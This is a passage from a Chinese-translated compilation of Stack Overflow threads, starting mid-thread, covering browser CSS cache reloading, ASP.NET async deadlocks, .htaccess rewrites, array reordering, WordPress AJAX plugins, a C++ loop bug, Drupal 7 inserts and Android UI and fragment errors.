> 时间：2015-10-19T16:01:27.850

我知道这是一个老问题，但如果有人仍在寻找如何重新加载单个外部 css/js 文件，那么现在在 Chrome 中最简单的方法是：

1.  转到DevTools中的*网络选项卡*
2.  右键单击资源并选择*Replay XHR*以重复请求

确保选择*禁用缓存*选项以强制重新加载。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2016-11-01T15:23:39.513

对于 macOS 铬：

1.  开放开发者工具`cmd`++`alt``i`
2.  点击开发者工具右上角的三个点
3.  点击设置
4.  向下滚动到`Network`
5.  启用`Disable cache (while DevTools is open)`看截图： [![在此处输入图像描述](../Images/8bf74fc278b5221ce9b691df96f4d5b2.png)](https://i.stack.imgur.com/UAIvw.png)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2014-06-10T09:48:47.403

为什么需要刷新整个页面？只需刷新css文件而不重新加载页面。例如，当您必须等待来自 DB 的长时间响应时，它非常有用。从数据库中获取数据并填充页面后，编辑您的 css 文件并在 Chrome（或 Firefox）中重新加载它们。为此，您需要安装[CSS Reloader 扩展](https://chrome.google.com/webstore/detail/css-reloader/dnfpcpfijpdhabaoieccoclghgplmpbd?hl=en)。Firefox 版本也可用。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2015-08-13T11:06:31.430

您可以将此脚本复制粘贴到 Chrome 控制台中，它会强制您的 CSS 脚本每 3 秒重新加载一次。有时我发现它在改进 CSS 样式时很有用。

```
var nodes = document.querySelectorAll('link');
[].forEach.call(nodes, function (node) {
    node.href += '?___ref=0';
});
var i = 0;
setInterval(function () {
    i++;

    [].forEach.call(nodes, function (node) {
        node.href = node.href.replace(/\?\_\_\_ref=[0-9]+/, '?___ref=' + i);
    });
    console.log('refreshed: ' + i);
},3000); 
```

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2016-10-22T06:10:51.553

我通过这个简单的技巧解决了。

```
<script type="text/javascript">
  var style = 'assets/css/style.css?'+Math.random();;
</script>

<script type="text/javascript">
  document.write('<link href="'+style+'" rel="stylesheet">');
</script> 
```

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2016-12-28T15:01:46.570

还是个问题。

使用“..css?something=random-value”之类的参数不会改变我的客户支持体验。只有名称更改有效。

文件重命名的另一种方法。我在 IIS 中使用 URL 重写。有时 Helicon 的 Isapi 重写。

添加新规则。

```
+ Name: lame-chrome-fix.
+ Pattern: styles/(\w+)_(\d+)
+ Rewrite URL: /{R:1}.css 
```

注意：我保留使用小写来将名称与随机数分开。可以是别的什么。

例子：

```
<link href="/styles/template_<% 
Response.Write( System.DateTime.UtcNow.ToString("ddmmyyhhmmss")); %>" 
type="text/css" /> 
```

（没有样式文件夹，它只是模式的名称部分）

输出代码为：

```
<link href="/styles/template_285316115328" 
rel="stylesheet" type="text/css"> 
```

重定向为：

（R:1 = 模板）

/模板.css

只是解释很长。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2020-12-07T20:28:24.037

一种选择是将您的工作目录添加到您的 Chrome“工作区”，这允许 Chrome 将本地文件映射到页面上的文件。然后它将检测本地文件中的更改，并实时更新页面。

这可以从 Devtools 的“Sources”选项卡中完成：

[![在此处输入图像描述](../Images/5074fb48c672231bcb6bc28751326e3a.png)](https://i.stack.imgur.com/M4ruu.png)

单击文件浏览器侧边栏中的“文件系统”选项卡，然后单击 + 加号按钮以“将文件夹添加到工作区” - 屏幕顶部将提示您允许或拒绝本地文件访问：

[![在此处输入图像描述](../Images/aa7073b174d930f4dfec86d6edafaa7d.png)](https://i.stack.imgur.com/ZZQoU.png)

一旦允许，该文件夹将出现在左侧的“文件系统”选项卡中。Chrome 现在将尝试将文件系统选项卡中的每个文件与页面中的文件相关联。有时您需要重新加载页面一次才能正常运行。

完成此操作后，Chrome 应该可以轻松获取本地更改，实际上在许多情况下您甚至不需要重新加载即可获取更改，并且您可以直接从 Devtools 对本地文件进行编辑（这非常有用对于 CSS，当您切换样式选项卡中的复选框时，它甚至会注释掉 CSS 行）。

[有关 Chrome 中的工作区的更多信息。](https://developers.google.com/web/tools/chrome-devtools/workspaces)

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2015-06-05T01:24:57.173

刚刚遇到这个问题，一个运行 Chrome（在 Mac 上）的人突然停止加载 CSS 文件。CMD + R 根本不起作用。我不喜欢上面强制在生产系统上永久重新加载的建议。

起作用的是在 HTML 文件中更改 CSS 文件的名称（当然还有重命名 CSS 文件）。这迫使 Chrome 去获取最新的 CSS 文件。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2015-11-28T02:22:09.613

如果您使用的是 Sublime Text 3，则使用构建系统打开文件会打开最新版本，并提供一种方便的方式来加载它，通过 [CTRL + B] 设置在 chrome 中打开文件的构建系统：

1.  转到“工具”

2.  将鼠标悬停在“构建系统”上。在弹出的列表底部，单击“新建构建系统...”

3.  在新的构建系统文件中输入：

    ```
    {"cmd": [ "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", "$file"]} 
    ```

**假设上述第一组引号中的路径是您计算机上chrome所在的路径，如果不是简单地找到chrome的位置并将第一组引号中的路径替换为路径电脑上的铬。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2016-11-02T12:37:05.673

实现目标的最简单方法是在 chrome中**打开一个新的隐身窗口或****在 Firefox**中打开一个私人窗口，默认情况下，不会缓存。

您可以将其用于开发目的，这样您就不必在项目中注入一些随机缓存阻止代码。

如果您使用的是 IE，那么上帝会帮助您！

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2017-07-24T19:49:24.030

`Ctrl`+`F5`

`Shift`+`F5`

两者都工作

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2017-10-29T12:15:31.680

Safari 11.0 macOS SIERRA 10.12.6 上最简单的方法：从 Origin 重新加载页面，您可以使用帮助查找它在菜单中的位置，也可以使用快捷键选项（alt）+ command + R。

* * *

## 回答 #23

> 赞同：-1
> 
> 时间：2014-09-02T09:46:29.653

`Chrome/firefox/safari/IE`将通过这些快捷方式重新加载整个页面

`**Ctrl**`+ `**R**` (或) `**Ctrl**`+`**F5**`

希望它可以帮助你！

* * *

## 回答 #24

> 赞同：-1
> 
> 时间：2017-08-30T18:09:51.703

如果您使用 SiteGround 作为您的托管公司，并且其他解决方案均无效，请尝试以下操作：

在 cPanel 中，转到“站点改进工具”并单击“SuperCacher”。在下一页上，单击“刷新缓存”按钮。

# task - 在 MVC 操作中调用任务方法但当前线程被锁定

> ID：15562385
> 
> 赞同：0
> 
> 时间：2013-03-22T03:46:24.850
> 
> 标签：task, deadlock

```
public class HomeController : Controller
    {   
        public ActionResult Index()
        {
            var t1= Test1().Result;
            return View();
        }

        private async Task<HttpResponseMessage> Test1()
        {
            string strUrl = "http://localhost:52033/api/values";
            var instanceClient = new HttpClient();
            var requestMessage = new HttpRequestMessage(HttpMethod.Get, strUrl);
            var httpRespons = await instanceClient.SendAsync(requestMessage);
            return httpRespons;
        }
    } 
```

当我在Index Action 中调用Test1()。结果; 当当前线程程序一直没有响应时会发生死锁，不带Result调用后缀就可以正常运行！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T12:32:32.877

您不应该在 ASP.NET 上下文中调用`Result`or ；`Wait`一个原因是它可能导致死锁，[正如我在博客中解释的那样](http://blog.stephencleary.com/2012/07/dont-block-on-async-code.html)。

相反，您应该使用`await`，如下所示：

```
public async Task<ActionResult> Index()
{
    var t1 = await Test1();
    return View();
} 
```

# php - 将包含指定文件夹或目录的 URL 重定向到 php 文件

> ID：15562386
> 
> 赞同：0
> 
> 时间：2013-03-22T03:46:31.050
> 
> 标签：php, .htaccess, redirect

我有一个名为的文件夹`myfolder`，`myphpfile.php`如果有人请求包含`myfolder`.

示例网址：

```
http://mydomain.com/myfolder/for-test.html 
```

我写了一个`.htaccess`：

```
Options +FollowSymLinks
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^myfolder/.* /myphpfile.php [QSA]
</IfModule> 
```

但它不起作用。

# c# - 以自定义方式重新排序数组

> ID：15562387
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:46:31.397
> 
> 标签：c#, .net, list, split

我有一系列按以下顺序打印到 pdf 的项目。让我们说例如：

```
lines = {1, 2, 3, 
         4, 5, 6, 
         7, 8, 9, 
         10} 
```

是我的数组的内容。

但是我想将数组中项目的顺序更改为

```
 {1, 4, 7,
   2, 5, 8, 
   3, 6, 9, 
   10} 
```

然后我将此数组传递给我的打印引擎。基本上如果数组中有超过 3 个项目，我的新代码应该重新排序。

有人可以帮我弄清楚其中的逻辑。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T04:20:44.420

按行索引的模数和行数对行进行排序。

```
public static ICollection<T> Sort<T>(ICollection<T> lines, int columns)
{
    var rows = lines.Count/columns;
    if (rows == 0)
    {
        return lines;
    }
    return lines.Select((line, i) => new {line, i})
                .OrderBy(item => item.i < columns*rows ? item.i%rows : rows)
                .Select(item => item.line)
                .ToList();
} 
```

**编辑：**或者，您可以使用迭代器方法和列表的索引器而不是 LINQ：

```
public static IEnumerable<T> Sort<T>(IList<T> lines, int columns)
{
    var rows = lines.Count/columns;
    for (var i = 0; i < lines.Count; i++)
    {
        var index = rows > 0 && i < columns*rows
            ? (i%columns)*rows + i/columns
            : i;
        yield return lines[index];
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:04:45.313

假设“对于线性数组，假设每 9 个元素形成 3x3 矩阵转置每个子序列，保持余数不变”：

```
// assuming T[] items;
var toTranspose = (items.Count() / 9) * 9;
var remap = new int[]{1, 4, 7, 2, 5, 8, 3, 6, 9 };

var result = Enumerable.Range(0, toTranspose)
  .Select(pos => items[(pos / 9) * 9 + (remap[pos % 9] - 1)])
  .Concat(items.Skip(toTranspose)
  .ToArray(); 
```

代码摘要：

*   获取需要移动的项目数（即 9 个项目的组数`int numberOfGroup = Count()/9;`，乘以组大小）
*   在数组中进行自定义转换（请注意，索引按原样从样本中复制，实际上是在计算索引中`remap`逐一复制的）`-1`
*   `toTranspose`对于从相应组中获取源元素并应用转换的每个元素索引 `remap`。
*   最后`Concat`剩下的。

笔记：

*   如果需要，可以轻松提供自定义转换或内联转置。
*   不能将转换应用于最后一个部分组，因为元素必须转到不存在的位置。

# jquery - Infinite Scroll + Advanced Ajax Page Loader - 新的内容链接不再使用ajax | WordPress

> ID：15562391
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:47:14.617
> 
> 标签：jquery, wordpress

我对 AJAX、jQuery 和重新加载代码知之甚少，所以请记住这一点。

因此，我的 WordPress 网站使用插件“Infinite Scroll”和“Advanced Ajax Page Loader”。

发生的情况是，在我的网站初始加载时，默认显示的 10 个帖子都正常运行（单击时通过 Ajax [AAPL] 在线打开）。

现在，当我通过向下滚动页面来使用无限滚动功能以显示接下来的 10 个帖子时，帖子的链接标题将不再通过 AJAX 在线打开。

加载新内容时，Advanced Ajax Page Loader 插件将不适用于任何新显示的内容/链接。

我该怎么做才能使这些新调用的链接利用我的 AAPL Ajax 插件。我需要某种重新加载代码或 jQuery 脚本吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-06T15:45:00.017

您只需要刷新 AAPL。为此，请转到“无限滚动”插件选项页面，找到回调文本区域并粘贴`AAPL_loadPageInit("");`

# c++ - 连续 for 循环不会终止 C++

> ID：15562400
> 
> 赞同：0
> 
> 时间：2013-03-22T03:48:28.283
> 
> 标签：c++, if-statement, for-loop

多年来，我一直在努力寻找这个问题，我似乎无法理解它。当输入大于值 2 的数字时，程序只会连续输出 ' ' 或 '*' 并且不会终止，并给出正确的输出。

谁能看到我做错了什么？这是我的代码：

```
#include <iostream>
#include<cmath>
using namespace std;

int main()
{

     int xx; 

cout << "Enter the Height (odd positive numbers only): " << endl; 
cin >> xx; 

for(float y; y < xx; y++)
{
    for(float x; x < xx; x++)
    {
        x = abs( x - ( xx / 2 ) ); 
        y = abs( y - ( xx / 2 ) );

    if( ( x + y ) <= ( xx / 2 ) )

        cout << '*';
    else
        cout << ' ';
    } 
cout << endl;
} 
return 0; 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T03:55:55.073

首先，存在未定义的行为。`x`并且`y`需要初始化。

其次，你的`x`and`y`永远不会大于`xx`(if `xx>=2`)，因为你有：

```
x = abs( x - ( xx / 2 ) ); 
y = abs( y - ( xx / 2 ) ); 
```

因此无限循环。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:53:24.920

您必须在那里设置初始`for`循环值。假设您希望它们是`0`：

```
for(float y = 0; [...]
{
    for(float x = 0; [...]
    { 
```

否则，`y`and中使用的值`x`是随机的，取决于声明之前的内存内容。

还有表达式：

```
 x = abs( x - ( xx / 2 ) ); 
    y = abs( y - ( xx / 2 ) ); 
```

`xx`输入常数将不断递减 x 和 y（除非是`xx`负数或 = 0，当`xx`小于时会发生这种情况`2`）因此导致无限循环。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T03:56:10.393

对于大于等于`2`您的表达式的数字，将`x = abs( x - ( xx / 2 ) );`导致`x`递减。所以无限循环

例如 if `xx == 2`, then`x`对于每个循环都保持不变，因为您通过in 表达式递减`x`值并在 for 循环内递增`1``x = abs( x - 1);`

也请在for循环中初始化变量

编辑：新设计

```
int temp1, temp2;
for(float y=0; y < xx; y++)
{
    for(float x=0; x < xx; x++)
    {
       temp1 = abs( x - ( xx / 2 ) ); 
       temp2 = abs( y - ( xx / 2 ) );

    //if( ( abs( x - ( xx / 2 ) ) + abs( y - ( xx / 2 ) ) ) <= ( xx / 2 ) )

    if( ( temp1 + temp2 ) <= ( xx / 2 ) )
        cout << '*';
    else
        cout << ' ';
    }
} 
```

# php - 如何在 drupal 7 中将值插入数据库？

> ID：15562403
> 
> 赞同：0
> 
> 时间：2013-03-22T03:48:57.477
> 
> 标签：php, database, drupal-7

我正在drupal 7中开发一个自定义模块，就像注册表一样，所有东西都正常工作，但我无法在我的db_table中插入记录。我在 drupal 7 中使用以下代码

```
function reg_fields_form_submit($form,&$form_state){
    $name = trim($form_state['values']['name']);
    $phone = trim($form_state['values']['phone']);
    $email = trim($form_state['values']['email']);
    $query = "INSERT INTO {registration} (name,phone,email) VALUES ('%s', '%s', '%s')";
    $result = db_query($query, array($name, $phone, $email));
if ($result !== FALSE){
    drupal_set_message('data saved successfully.');} 
```

但是在我的表中插入的值就像 %S,%S,%S 一样每次如何解决这个问题。而且我想在同一页面中显示插入的值。任何人帮助我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-03-07T15:58:17.953

Drupal 7 使用了新的数据库 API，其中包含[`db_insert()`](https://www.drupal.org/node/310079)强烈建议使用的函数来代替`db_query("INSERT")`

在您的情况下，您的代码将变为

```
function reg_fields_form_submit($form,&$form_state){
    $name = trim($form_state['values']['name']);
    $phone = trim($form_state['values']['phone']);
    $email = trim($form_state['values']['email']);
    $result = db_insert('registration')
    ->fields(array(
        name => $name,
        phone => $phone,
        email => $email,
    ))
    ->execute();
    if ($result){
        drupal_set_message('data saved successfully.');} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-22T04:43:29.447

看起来像drupal 7使用？对于未命名的占位符。所以用？而不是 %s 或使用命名占位符。[db_query](http://api.drupal.org/api/drupal/includes!database!database.inc/function/db_query/7)

建议使用[db_insert](http://api.drupal.org/api/drupal/includes!database!database.inc/function/db_insert/7)进行插入操作。

# java - Android/Java 重复按钮单击

> ID：15562405
> 
> 赞同：2
> 
> 时间：2013-03-22T03:49:08.907
> 
> 标签：java, android, multithreading, user-interface

我正在编写我的第一个 android 应用程序，并且正在尝试编写一个应用程序，您只需单击一个按钮即可显示一条消息，并且可以根据需要多次执行此操作。到目前为止，我有：

```
public class MyProject extends Activity
{
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        final TextView tv = new TextView(this);
        Button startButton = (Button) findViewById(R.id.startbutton);
        startButton.setOnClickListener(new View.OnClickListener() {
        public void onClick(View view) {
            tv.setText("Hello World!");
            setContentView(tv);
            Handler handler = new Handler(); 
            handler.postDelayed(new Runnable() { 
            public void run() {setContentView(R.layout.main);}}, 2000);     
        }
        });
    }
} 
```

但是这样做，当我回到主屏幕并再次单击按钮时......没有任何反应。如何获得重复的按钮点击以重复该行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:16:20.537

您的示例非常简单，据我了解，不需要多线程。

您只需初始化一次布局，之后您可以更新单个视图的内容。

所以......这将在每次按钮单击时设置“hello world”字符串，您不会注意到任何区别，因为字符串始终相同：D

```
public class MyProject extends Activity
{
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        // this is needed one time only
        setContentView(R.layout.main);

        // add your textview in xml
        final TextView tv = (TextView) findViewById(R.id.textView);
        final Button startButton = (Button) findViewById(R.id.startbutton);

        startButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                tv.setText("Hello World!");
            }
        }
    }
} 
```

为了做一些更有趣的事情，你可以设置一个计数器在每次点击时更新，这样文本视图的变化会更明显更有趣！

```
int i = 0;
startButton.setOnClickListener(new View.OnClickListener() {
    public void onClick(View view) {
        tv.setText("you have reached " + i);
        i++;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:20:06.340

在这里，您调用的是用包含“Hello World！”`setContentView`的内容替换整个当前视图。`TextView`然后在两秒钟后`setContentView`再次将其设置回主布局。由于`OnCreate`仅在创建活动时调用一次，因此永远不会再次设置 OnClickListener。

此代码将执行您要查找的操作。

```
public class MyActivity extends Activity
    implements View.OnClickListener{

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        init();
    }

    private void init() {
        setContentView(R.layout.main);
        Button startButton = (Button) findViewById(R.id.startbutton);
        startButton.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        TextView tv = new TextView(this);
        tv.setText("Hello World!");
        setContentView(tv);
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                init();
            }
        }, 2000);
    }
} 
```

您可能会注意到`OnClick`在我的示例中这是一个单独的方法。这是因为我实现了接口`View.OnClickListener`。我能够将实现的方法编写为我的类的一部分，然后`this`作为参数传递给`setOnClickListener`. 我正在解释这一点，因为您提到您是 Java 新手。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:06:22.050

```
 TextView txt;
// our handler
 Handler handler = new Handler() {
  @Override
  public void handleMessage(Message msg) {

//display each item in a single line
  txt.setText(txt.getText()+"Item "+System.getProperty("line.separator"));
     }
 };
public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.main);
  txt=(TextView)findViewById(R.id.txt);
 }

 @Override
 protected void onStart() {
  super.onStart();
              // create a new thread
  Thread background=new Thread(new Runnable() {

   @Override
   public void run() {
    for(int i=0;i<10;i++)
    {
     try {
     Thread.sleep(1000);      
     b.putString("My Key", "My Value: "+String.valueOf(i));
    // send message to the handler with the current message handler          

      handler.sendMessage(handler.obtainMessage());
     } catch (Exception e) {
      Log.v("Error", e.toString());
     }
    }
   }
  });

  background.start();
 }
} 
```

注意：这里处理一种类型的线程不更新任何 UI [从这里举个例子](http://mobileorchard.com/android-app-developmentthreading-part-1-handlers/)

# css - 简单表单按钮提交不显示在 IE 8-7

> ID：15562410
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:49:21.337
> 
> 标签：css, forms, internet-explorer

那些超级 IE 疑难解答。这是错误。在这个表单的底部：http: [//xquives.kiaistudio.com/new-form/index.php](http://xquives.kiaistudio.com/new-form/index.php)有两个按钮。它们在 IE10 FF 等中看起来很完美，但在 IE 9-8-7 中却不是。我该如何解决？

按钮框CSS：

```
#buttonbox {
    display : block;
    margin-top:20px;
    margin-bottom : 20px;
    overflow:auto;
    float:right;
} 
```

按钮类css：

```
.button {
    background:#5f6156;
    background:rgba(0, 0, 0, 0.6);
    color:#FFF;
    padding: 5px;
    float: left;
    width: 100px;
    border: 1px solid #000;
    font-size: 12px;
    font-weight: bold;
    margin:10px;
    display:block;
    height:30px;
}
.button:hover {
    color:#D3411F;
} 
```

按钮 div html：

```
<div id="buttonbox">
    <input name="SOUMETTRE" type="submit" class="button"/>
    <input name="REINITIALISER" type="reset" class="button" />
</div> 
```

-- 更多信息，IE 7-8-9 中无用的按钮是黑色的，没有文字（或黑色文字），所以我们看不到文字......但是从 OK 触发帖子......只是看不到FF 或 IE10 中的文本

--

这是一个汇总起来的多个屏幕截图！

![在此处输入图像描述](../Images/b7e6e68296c8290d8f78bcba6476f152.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T20:51:47.930

输入标签需要有一个 value 属性来告诉浏览器要显示什么文本 – Cody Guldner 3 月 22 日 20:34

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-23T03:57:42.717

`input`尽管由于链接已损坏，我无法看到所有代码，但我会假设您已通过某种伪类将文本插入到 中，例如`:before`or `:after`。我知道这一点，因为

1.  你没有`value`属性`input`
2.  您必须使用较低级浏览器不支持的东西
3.  所以它可能不是 jQuery，因为它有很好的浏览器支持

所以要解决这个问题，你需要做的就是`value`在`input`. 这将确保始终显示文本，因为它是硬编码到 HTML 中的。

这些按钮仍然具有它们的功能。只是没有人会知道他们在做什么/

# android - 膨胀类片段时出错 - 重复 id/illegalargumentexception？

> ID：15562416
> 
> 赞同：27
> 
> 时间：2013-03-22T03:49:52.540
> 
> 标签：android, android-fragments, android-listfragment

我正在尝试使我正在构建的应用程序从主要活动中获取搜索词，返回结果，然后让结果可点击，以便可以从每个结果中查看详细信息。我通过使用 MainActivity、ResultsActivity 和 PlaceActivity，然后使用 ListFragmentClickable（它扩展 ListFragment）来做到这一点。如果手机以纵向模式定向，则结果列表应该是可见的，只有在单击结果时才能查看详细信息。如果手机是景观，则选择项目时应弹出列表的右侧窗口。

在运行时，我收到一个错误，显示为“错误膨胀类片段”。我不知道是什么原因造成的，我很想帮助摆脱它。

我的 ResultsActivity 调用了我的 ListFragmentClickables，它位于：

```
public class ResultsActivity extends FragmentActivity implements ListFragmentClickable.OnItemSelectedListener{

private ArrayAdapter<String> mAdapter;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_results_view);

    //Receive searchTerm from MainActivity
    Intent intent = getIntent();
    String searchTerm = intent.getStringExtra(MainActivity.SEARCH_TERM);

    mAdapter = new ArrayAdapter<String>(this, R.layout.item_label_list);

    FragmentManager     fm = getSupportFragmentManager();
    FragmentTransaction ft = fm.beginTransaction();

    FactualResponderFragment responder = (FactualResponderFragment) fm.findFragmentByTag("RESTResponder");
    if (responder == null) {
        responder = new FactualResponderFragment();
        ft.add(responder, "RESTResponder");
    }

    Bundle bundle = new Bundle();
    bundle.putString("search_term", searchTerm);
    responder.setArguments(bundle);

    ft.commit();
}

public ArrayAdapter<String> getArrayAdapter() {
    return mAdapter;
}

@Override //creates a DetailFragment when a list item is selected
public void onItemSelected(String link) {
    DetailFragment fragment = (DetailFragment) getSupportFragmentManager().findFragmentById(R.id.detailFragment);
    if (fragment != null && fragment.isInLayout()) {
          fragment.setText(link);
    } else {
      Intent intent = new Intent(getApplicationContext(), PlaceActivity.class);
          intent.putExtra(PlaceActivity.EXTRA_URL, link);
      startActivity(intent);
    }
} 
```

}

这是 ListFragmentClickable 类：

```
public class ListFragmentClickable extends ListFragment{

  private OnItemSelectedListener listener;

  public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { 
      View view = inflater.inflate(R.layout.activity_results_view, container, false);
      return view;
  }

  @Override
      public void onListItemClick(ListView l, View v, int position, long id) {
          updateDetail(); //see bottom
      }

  public interface OnItemSelectedListener {
      public void onItemSelected(String link);
  }

  @Override
  public void onAttach(Activity activity) {
      super.onAttach(activity);
      if (activity instanceof OnItemSelectedListener) {
          listener = (OnItemSelectedListener) activity;
      } else {
          throw new ClassCastException(activity.toString()
            + " must implemenet ListFragmentClickable.OnItemSelectedListener");
      }
  }

 public void updateDetail() {
        // Create fake data
    String newTime = String.valueOf(System.currentTimeMillis());
    // Send data to Activity
    listener.onItemSelected(newTime); //should direct PlaceActivity!!
  }
} 
```

这是我的 ResultsActivity (activity_results_activity.xml) 的布局文件：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

<fragment
    android:id="@+id/fragment_content"
    android:layout_width="0dp"
    android:layout_weight="1"
    android:layout_height="match_parent"
    android:layout_marginTop="?android:attr/actionBarSize"
    class="com.example.blobtag2.ListFragmentClickable" ></fragment>

<ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent"
    android:layout_height="50dp"
    android:divider="#b5b5b5"
    android:dividerHeight="1dp"></ListView>

</LinearLayout> 
```

最后是日志：

```
03-21 22:32:03.297: E/AndroidRuntime(764): FATAL EXCEPTION: main
03-21 22:32:03.297: E/AndroidRuntime(764): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.blobtag2/com.example.blobtag2.ResultsActivity}: android.view.InflateException: Binary XML file line #7: Error inflating class fragment
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.ActivityThread.access$600(ActivityThread.java:130)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.os.Handler.dispatchMessage(Handler.java:99)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.os.Looper.loop(Looper.java:137)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.ActivityThread.main(ActivityThread.java:4745)
03-21 22:32:03.297: E/AndroidRuntime(764):  at java.lang.reflect.Method.invokeNative(Native Method)
03-21 22:32:03.297: E/AndroidRuntime(764):  at java.lang.reflect.Method.invoke(Method.java:511)
03-21 22:32:03.297: E/AndroidRuntime(764):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
03-21 22:32:03.297: E/AndroidRuntime(764):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
03-21 22:32:03.297: E/AndroidRuntime(764):  at dalvik.system.NativeStart.main(Native Method)
03-21 22:32:03.297: E/AndroidRuntime(764): Caused by: android.view.InflateException: Binary XML file line #7: Error inflating class fragment
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:704)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.rInflate(LayoutInflater.java:746)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.inflate(LayoutInflater.java:489)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.inflate(LayoutInflater.java:396)
03-21 22:32:03.297: E/AndroidRuntime(764):  at com.example.blobtag2.ListFragmentClickable.onCreateView(ListFragmentClickable.java:32)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:846)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1061)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.support.v4.app.FragmentManagerImpl.addFragment(FragmentManager.java:1160)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.support.v4.app.FragmentActivity.onCreateView(FragmentActivity.java:272)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:676)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.rInflate(LayoutInflater.java:746)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.inflate(LayoutInflater.java:489)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.inflate(LayoutInflater.java:396)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.inflate(LayoutInflater.java:352)
03-21 22:32:03.297: E/AndroidRuntime(764):  at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:256)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.Activity.setContentView(Activity.java:1867)
03-21 22:32:03.297: E/AndroidRuntime(764):  at com.example.blobtag2.ResultsActivity.onCreate(ResultsActivity.java:37)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.Activity.performCreate(Activity.java:5008)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1079)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2023)
03-21 22:32:03.297: E/AndroidRuntime(764):  ... 11 more
03-21 22:32:03.297: E/AndroidRuntime(764): Caused by: java.lang.IllegalArgumentException: Binary XML file line #7: Duplicate id 0x7f070003, tag null, or parent id 0x0 with another fragment for com.example.blobtag2.ListFragmentClickable
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.support.v4.app.FragmentActivity.onCreateView(FragmentActivity.java:277)
03-21 22:32:03.297: E/AndroidRuntime(764):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:676)
03-21 22:32:03.297: E/AndroidRuntime(764):  ... 30 more 
```

